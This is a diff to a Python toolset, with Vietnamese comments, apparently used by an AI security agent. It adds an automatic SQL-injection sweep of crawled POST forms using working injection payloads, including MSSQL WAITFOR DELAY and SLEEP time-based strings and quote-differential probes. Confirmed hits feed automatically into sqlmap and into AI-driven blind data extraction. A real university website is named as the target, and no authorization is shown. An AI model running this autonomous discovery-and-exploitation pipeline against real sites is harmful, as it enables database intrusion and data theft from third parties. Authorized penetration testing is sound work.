@@ -438,6 +438,23 @@ _WAPITI_SEV = {0: "info", 1: "low", 2: "medium", 3: "high", 4: "critical"}
 _WAPITI_SEV_RANK = {"info": 0, "low": 1, "medium": 2, "high": 3, "critical": 4}
 _WAPITI_MAX_EXPLOIT = 3  # số SQLi tối đa tự đẩy sang sqlmap_runner mỗi lượt
 
+# v1.5.5: param phân trang mặc định BỎ TẤN CÔNG (--skip) — GET phase không đốt
+# hết max-attack-time trên N URL ?page=N (tbu.edu.vn: 52 URL page → module sql
+# chết trước khi tới form POST keyword). User override bằng skipped_parameters
+# (chuỗi phân tách dấu phẩy hoặc list); truyền chuỗi rỗng để tắt skip.
+_WAPITI_SKIP_PARAMS: tuple[str, ...] = (
+    "page", "p", "pageindex", "page_id", "pageid", "offset", "limit",
+    "start", "per_page", "perpage", "pageno", "page_number", "pagenumber",
+    "pg",
+)
+# v1.5.5: field form bỏ qua trong form sweep (CSRF/captcha/honeypot/...)
+_WAPITI_FORM_SKIP_FIELDS: tuple[str, ...] = (
+    "csrf", "csrftoken", "token", "captcha", "honeypot", "__viewstate",
+    "__eventvalidation", "authenticity_token", "_token", "submit", "button",
+    "file", "image", "x", "y", "op", "action",
+)
+_WAPITI_MAX_SWEEP_FORMS = 10  # số field form POST tối đa sweep mỗi lượt
+
 # v1.5.0: hướng dẫn BƯỚC TIẾP THEO theo category trong report JSON wapiti
 # (category ổn định theo version — không phải tên module). Category chưa có
 # trong map → fallback dùng solution từ classifications trong report.
@@ -592,6 +609,259 @@ def _wapiti_sqli_target(base_url: str, f: dict) -> tuple[str, str | None]:
     return t, None
 
 
+# ─────────────────────────────────────────────
+# v1.5.5: FORM SWEEP — tự tìm SQLi trên form POST mà wapiti crawl được
+# (không cần user trỏ tay vào URL form). Đọc form từ session DB wapiti
+# (--store-session) rồi test từng field: MSSQL error-based oracle →
+# quote-differential → time-based (giới hạn).
+# ─────────────────────────────────────────────
+
+
+def _sweep_finding(base_url: str, path: str, param: str, evidence: str) -> dict:
+    """Finding chuẩn cho form sweep — khớp schema _wapiti_parse_report.
+
+    path phải là RELATIVE (urlparse(url).path + query) để dedupe với finding
+    wapiti (key: category, method, path, parameter) và để _wapiti_sqli_target
+    build đúng target sqlmap; URL đầy đủ nằm trong info.
+    """
+    from urllib.parse import urlparse
+    p = urlparse(path)
+    rel = p.path or "/"
+    if p.query:
+        rel += "?" + p.query
+    full = f"{base_url.rstrip('/')}/{rel.lstrip('/')}"
+    return {
+        "category": "SQL Injection",
+        "module": "sql-form-sweep",
+        "method": "POST",
+        "path": rel,
+        "parameter": param,
+        "level": 4,
+        "info": f"{full} — form sweep (POST {param})",
+        "wstg": ["WSTG-INPV-05"],
+        "http_request": "",
+        "curl_command": f"curl -s -X POST '{full}' -d '{param}=test'",
+        "referer": "",
+        "evidence": evidence,
+    }
+
+
+def _sweep_oracle(base_url: str, path: str, param: str, data: dict,
+                  req_timeout: int) -> tuple[bool, str]:
+    """MSSQL error-based oracle (MsSqlErrorOracle.detect) — tối đa 3 request.
+    Trả (confirmed, evidence). In của oracle bắt qua redirect_stdout.
+    """
+    import contextlib
+    import io
+    try:
+        from sqli_blind_poc import MsSqlErrorOracle
+    except ImportError:  # khi tools.py được import từ nơi khác
+        import importlib.util
+        here = os.path.dirname(os.path.abspath(__file__))
+        spec = importlib.util.spec_from_file_location(
+            "sqli_blind_poc", os.path.join(here, "sqli_blind_poc.py"))
+        mod = importlib.util.module_from_spec(spec)
+        spec.loader.exec_module(mod)
+        MsSqlErrorOracle = mod.MsSqlErrorOracle
+    buf = io.StringIO()
+    try:
+        with contextlib.redirect_stdout(buf):
+            oracle = MsSqlErrorOracle(base_url + "/" + path.lstrip("/"),
+                                      method="post", param=param, data=data,
+                                      timeout=req_timeout)
+            ok = oracle.detect()
+    except Exception as e:  # noqa: BLE001
+        return False, f"oracle lỗi: {e}"
+    ev = buf.getvalue().strip()
+    return ok, ev or "oracle: không có output"
+
+
+def _sweep_quote_diff(base_url: str, path: str, param: str, data: dict,
+                     req_timeout: int) -> tuple[bool, str]:
+    """Quote-differential — 3 request: baseline 'test' vs 'test'' vs "test'".
+    Nháy đơn LÀM VỠ truy vấn (500/khác size) mà nháy đơn kép KHỚP baseline
+    → điểm chèn SQLi xác nhận (không cần biết engine). Trả (confirmed, ev).
+    """
+    import requests
+    url = base_url + "/" + path.lstrip("/")
+    seed = "test"
+
+    def send(value: str):
+        try:
+            body = {k: list(v) for k, v in data.items()}
+            body[param] = [value]
+            r = requests.post(url, data=body, timeout=req_timeout,
+                              headers={"User-Agent": "Mozilla/5.0"})
+            return r.status_code, len(r.content), r
+        except requests.RequestException as e:
+            return 0, 0, f"lỗi {e}"
+
+    b_st, b_ln, resp_b = send(seed)
+    q1_st, q1_ln, _ = send(seed + "'")
+    q2_st, q2_ln, _ = send(seed + "''")
+    ev = (f"baseline: status={b_st} len={b_ln} | quote-single: status={q1_st} "
+          f"len={q1_ln} | quote-double: status={q2_st} len={q2_ln}")
+    if b_st == 0:
+        return False, ev + " | baseline lỗi kết nối"
+    broken = (q1_st != b_st) or (abs(q1_ln - b_ln) > 50)
+    match = (q2_st == b_st) and (abs(q2_ln - b_ln) <= 50)
+    if broken and match:
+        return True, ev + " | quote-single VỠ truy vấn, quote-double khớp baseline → SQLi"
+    return False, ev
+
+
+def _sweep_time_based(base_url: str, path: str, param: str, data: dict,
+                      engine: str, req_timeout: int,
+                      delay: int = 3) -> tuple[bool, str]:
+    """Time-based 2-request single-payload: baseline vs WAITFOR DELAY/SLEEP.
+    Chỉ gọi khi ≤5 field (kế hoạch v1.5.5). Trả (confirmed, ev).
+    """
+    import time as t
+    import requests
+    url = base_url + "/" + path.lstrip("/")
+    if engine == "mssql":
+        payload = f"'; WAITFOR DELAY '0:0:{delay}'-- -"
+    else:
+        payload = f"' OR SLEEP({delay})-- -"
+
+    def send(value: str):
+        try:
+            body = {k: list(v) for k, v in data.items()}
+            body[param] = [value]
+            t0 = t.monotonic()
+            r = requests.post(url, data=body, timeout=req_timeout + delay,
+                              headers={"User-Agent": "Mozilla/5.0"})
+            return r.status_code, t.monotonic() - t0
+        except requests.RequestException:
+            return 0, 0.0
+
+    b_st, b_el = send("test")
+    p_st, p_el = send(payload)
+    ev = f"baseline: {b_el:.1f}s | payload: {p_el:.1f}s (delay={delay}s)"
+    if p_st and p_el >= b_el + delay * 0.7:
+        return True, ev + " | payload chậm hơn baseline → SQLi time-based"
+    return False, ev
+
+
+_engine_cache: dict[str, str] = {}
+
+
+def _sweep_engine(base_url: str, req_timeout: int) -> str:
+    """1 GET /host → _guess_engine, cache theo host (headers request của wapiti
+    không chứa thông tin engine nên phải GET nhanh 1 lần)."""
+    import requests
+    from urllib.parse import urlparse
+    host = urlparse(base_url).netloc
+    if host in _engine_cache:
+        return _engine_cache[host]
+    eng = ""
+    try:
+        r = requests.get(base_url, timeout=min(req_timeout, 20),
+                         headers={"User-Agent": "Mozilla/5.0"})
+        eng = _guess_engine(r)
+    except requests.RequestException:
+        pass
+    _engine_cache[host] = eng
+    return eng
+
+
+def _form_sweep(base_url: str, session_dir: str, budget: int, req_timeout: int,
+                cookie: str = "") -> tuple[list[dict], list[str]]:
+    """v1.5.5: đọc form POST từ session DB wapiti → tự test SQLi từng field.
+
+    Trả (findings, log_lines). Không có DB/không có form → ([], []).
+    Budget-aware: dừng khi budget - elapsed - 10. Rate 0.5s giữa các field.
+    """
+    import sqlite3
+    import time as t
+    dbs = [os.path.join(session_dir, f) for f in os.listdir(session_dir)
+           if f.endswith(".db")]
+    if not dbs:
+        return [], ["[i] form sweep: không có session DB wapiti — bỏ qua"]
+    findings: list[dict] = []
+    logs: list[str] = []
+    t0 = t.monotonic()
+    engine = _sweep_engine(base_url, req_timeout)
+    if engine:
+        logs.append(f"[i] form sweep: engine ước lượng từ headers = {engine}")
+    seen: set[tuple] = set()
+    for db in dbs:
+        try:
+            con = sqlite3.connect(f"file:{db}?mode=ro", uri=True)
+        except Exception as e:  # noqa: BLE001
+            logs.append(f"[i] form sweep: bỏ qua DB {os.path.basename(db)} ({e})")
+            continue
+        try:
+            cur = con.cursor()
+            cur.execute("SELECT p.path_id, p.name, p.value1, pa.path "
+                        "FROM params p JOIN paths pa ON p.path_id=pa.path_id "
+                        "WHERE p.type='POST'")
+            rows = cur.fetchall()
+        except Exception as e:  # noqa: BLE001
+            logs.append(f"[i] form sweep: đọc session DB lỗi ({e})")
+            con.close()
+            continue
+        con.close()
+        forms: dict[int, dict] = {}
+        for pid, name, val, path in rows:
+            # session DB lưu URL ĐẦY ĐỦ (vd https://tbu.edu.vn/WebTinTuc/TimKiem)
+            # → chuẩn hoá về RELATIVE (path + query) để test functions và
+            # _sweep_finding dùng chung (dedupe + sqlmap target đúng).
+            from urllib.parse import urlparse as _up
+            _p = _up(str(path))
+            rel = _p.path or "/"
+            if _p.query:
+                rel += "?" + _p.query
+            forms.setdefault(pid, {"path": rel, "fields": []})
+            forms[pid]["fields"].append((str(name), str(val or "")))
+        for pid, form in forms.items():
+            path = form["path"]
+            fields = [f for f in form["fields"]
+                      if f[0].lower() not in _WAPITI_FORM_SKIP_FIELDS]
+            if not fields:
+                continue
+            fields = fields[:_WAPITI_MAX_SWEEP_FORMS]
+            data = {n: [v] for n, v in form["fields"]}
+            for name, _val in fields:
+                if t.monotonic() - t0 > budget - 10:
+                    logs.append("[i] form sweep: hết budget — dừng sớm")
+                    return findings, logs
+                key = ("POST", path, name)
+                if key in seen:
+                    continue
+                seen.add(key)
+                confirmed = False
+                ev = ""
+                # 1) MSSQL error-based oracle (chỉ khi engine ước lượng = mssql)
+                if engine == "mssql":
+                    ok, ev = _sweep_oracle(base_url, path, name, data, req_timeout)
+                    if ok:
+                        confirmed = True
+                # 2) quote-differential (mọi engine)
+                if not confirmed:
+                    ok, ev2 = _sweep_quote_diff(base_url, path, name, data,
+                                                req_timeout)
+                    ev = ev2 if not ev else ev + "\n" + ev2
+                    if ok:
+                        confirmed = True
+                # 3) time-based (chỉ khi ≤5 field — kế hoạch v1.5.5)
+                if not confirmed and len(fields) <= 5:
+                    ok, ev3 = _sweep_time_based(base_url, path, name, data,
+                                                engine, req_timeout)
+                    ev = ev + "\n" + ev3 if ev else ev3
+                    if ok:
+                        confirmed = True
+                if confirmed:
+                    findings.append(_sweep_finding(base_url, path, name, ev))
+                    logs.append(f"[+] form sweep: SQLi CONFIRMED POST {path} "
+                                f"param={name}")
+                else:
+                    logs.append(f"[-] form sweep: {path} param={name} — "
+                                f"không nhiễm")
+                t.sleep(0.5)  # rate limit nhẹ tránh WAF burst
+    return findings, logs
+
+
 def _wapiti_scan(**kw):
     """v1.5.0: wapiti 3.2.10 — crawler + TOÀN BỘ attack modules (29 module).
 
@@ -632,17 +902,34 @@ def _wapiti_scan(**kw):
     budget = int(kw.get("_timeout") or 300)
     scan_time = max(30, min(int(kw.get("max_scan_time") or min(budget - 20, 300)),
                             min(budget - 20, 1800)))
-    attack_time = max(15, min(int(kw.get("max_attack_time") or 90),
+    attack_time = max(15, min(int(kw.get("max_attack_time") or 150),
                               max(15, scan_time // 2)))
     exploit = bool(kw.get("exploit", True))
+    # v1.5.5: skipped_parameters — user override (chuỗi phẩy hoặc list);
+    # rỗng = tắt skip. Mặc định skip param phân trang (--skip) để GET phase
+    # không đốt hết max-attack-time trên N URL ?page=N trước khi tới form POST.
+    skip_raw = kw.get("skipped_parameters")
+    if skip_raw is None:
+        skip_params = list(_WAPITI_SKIP_PARAMS)
+    elif isinstance(skip_raw, (list, tuple)):
+        skip_params = [str(s).strip() for s in skip_raw if str(s).strip()]
+    else:
+        skip_params = [s.strip() for s in str(skip_raw).split(",") if s.strip()]
 
     report_dir = tempfile.mkdtemp(prefix="aixsec-x_wapiti_")
     report_path = os.path.join(report_dir, "report.json")
+    # v1.5.5: --store-session — wapiti lưu session/crawl DB vào thư mục riêng
+    # để form sweep đọc form POST (params table) sau khi scan xong.
+    session_dir = os.path.join(report_dir, "session")
+    os.makedirs(session_dir, exist_ok=True)
     args = ["wapiti", "-u", url, "--scope", scope, "-m", ",".join(mods),
             "-d", str(depth), "--tasks", str(tasks),
             "--max-scan-time", str(scan_time), "--max-attack-time", str(attack_time),
             "-t", str(req_timeout), "-f", "json", "-o", report_path,
-            "--flush-session", "--no-bugreport", "-v", "1"]
+            "--flush-session", "--no-bugreport", "-v", "1",
+            "--store-session", session_dir]
+    for sp in skip_params:
+        args += ["--skip", sp]
     if kw.get("cookie"):
         args += ["-C", str(kw["cookie"])]
     t0 = time.monotonic()
@@ -673,8 +960,28 @@ def _wapiti_scan(**kw):
     findings = rep["findings"]
     craw = rep["crawled"] or 0
     ver = rep["version"].replace("Wapiti ", "")
+
+    # ── v1.5.5: FORM SWEEP — tự tìm SQLi trên form POST từ session DB wapiti
+    # (không cần user trỏ tay vào URL form). Chạy NGAY CẢ khi wapiti 0 finding;
+    # kết quả merge vào findings TRƯỚC early-return và trước summary/auto-exploit.
+    sweep_findings, sweep_logs = _form_sweep(url, session_dir, budget,
+                                             req_timeout, cookie=str(kw.get("cookie") or ""))
+    if sweep_findings:
+        existing = {(f["category"], f["method"], f["path"], f["parameter"])
+                    for f in findings}
+        for sf in sweep_findings:
+            k = (sf["category"], sf["method"], sf["path"], sf["parameter"])
+            if k not in existing:
+                findings.append(sf)
+                existing.add(k)
+        findings.sort(key=lambda x: (_WAPITI_SEV_RANK.get(_WAPITI_SEV.get(x["level"], "info"), 0),
+                                     x["category"], x["path"]), reverse=True)
+
     lines = [f"[✓] wapiti QUÉT XONG (v{ver}) — {rep['target']} "
              f"[scope={rep['scope']}, {craw} URL/form, {len(findings)} mục]"]
+    if sweep_logs:
+        lines.append("[i] FORM SWEEP (tự tìm SQLi trên form POST):")
+        lines.extend(sweep_logs)
     if not findings:
         lines.append("[i] KHÔNG phát hiện lỗ hổng nào trong phạm vi này.")
         lines.append("[→] BƯỚC TIẾP THEO: hẹp phạm vi (scope=page/folder, -d sâu hơn), "
@@ -1641,7 +1948,7 @@ TOOL_REGISTRY: list[ToolSpec] = [
 
     # ── WAPITI (v1.5.0) ──
     ToolSpec("wapiti_scan",
-             "v1.5.3: Quét TOÀN BỘ website bằng wapiti (crawler + 29 attack module: "
+             "v1.5.5: Quét TOÀN BỘ website bằng wapiti (crawler + 29 attack module: "
              "sql/timesql, xss/permanentxss, exec, file, xxe, ssrf, ldap, crlf, redirect, "
              "backup, htaccess, buster, csrf, methods, cms, wp_enum, network_device, "
              "log4shell, spring4shell, shellshock, takeover, upload, htp, nikto, wapp, "
@@ -1650,10 +1957,14 @@ TOOL_REGISTRY: list[ToolSpec] = [
              "tự đẩy sang sqlmap_runner (sqlmap-FIRST, max 3 mục); sqlmap THẤT BẠI → "
              "AI tự khai thác bằng sqli_blind_extract (known_confirmed=true). Cuối output có "
              "mục TỔNG HỢP LỖ HỔNG — hướng khai thác + khắc phục từng category (dùng viết "
-             "final JSON findings[].fix). THAY CHO công cụ tìm form cũ (đã gỡ v1.5.3): crawler wapiti "
-             "tìm form/param cho sqli_manual_test. Report JSON lưu /tmp làm "
-             "bằng chứng. CSP/security headers/cookie flags/https-redirect là CATEGORY trong "
-             "report (không phải module chạy riêng) — nằm trong phần info của scan.",
+             "final JSON findings[].fix). v1.5.5: TỰ TÌM SQLi TRÊN FORM POST — chỉ cần nhập "
+             "root domain (vd https://tbu.edu.vn), wapiti crawl + form sweep đọc session DB "
+             "(--store-session) rồi test từng field form (MSSQL error-based oracle → "
+             "quote-differential → time-based giới hạn) — KHÔNG cần trỏ tay vào URL form. "
+             "Param phân trang (page/p/offset/...) mặc định bị --skip để module sql không "
+             "đốt hết max-attack-time trên ?page=N trước khi tới form POST. Report JSON lưu "
+             "/tmp làm bằng chứng. CSP/security headers/cookie flags/https-redirect là CATEGORY "
+             "trong report (không phải module chạy riêng) — nằm trong phần info của scan.",
              {"type": "object",
               "properties": {
                   "url": {"type": "string", "pattern": "^https?://",
@@ -1668,7 +1979,7 @@ TOOL_REGISTRY: list[ToolSpec] = [
                   "max_scan_time": {"type": "integer", "minimum": 30, "maximum": 1800,
                                     "description": "Giây tối đa pha scan (mặc định 300)"},
                   "max_attack_time": {"type": "integer", "minimum": 15,
-                                      "description": "Giây tối đa mỗi module attack (mặc định 90; tự giới hạn ≤ scan_time/2)"},
+                                      "description": "Giây tối đa mỗi module attack (mặc định 150; tự giới hạn ≤ scan_time/2)"},
                   "tasks": {"type": "integer", "minimum": 1, "maximum": 8,
                             "description": "Số task song song (mặc định 3)"},
                   "timeout": {"type": "integer", "minimum": 5, "maximum": 30,
@@ -1677,6 +1988,8 @@ TOOL_REGISTRY: list[ToolSpec] = [
                               "description": "true (mặc định): SQLi CONFIRMED tự chạy sqlmap_runner"},
                   "cookie": {"type": "string",
                              "description": "Cookie phiên cho vùng cần đăng nhập (VD 'PHPSESSID=x;...')"},
+                  "skipped_parameters": {"type": "string",
+                                         "description": "Override param bị --skip (phân tách phẩy, vd 'page,offset'); mặc định skip page/p/offset/limit/...; truyền chuỗi rỗng để tắt skip"},
               },
               "required": ["url"]},
              _wapiti_scan, risk="noisy"),
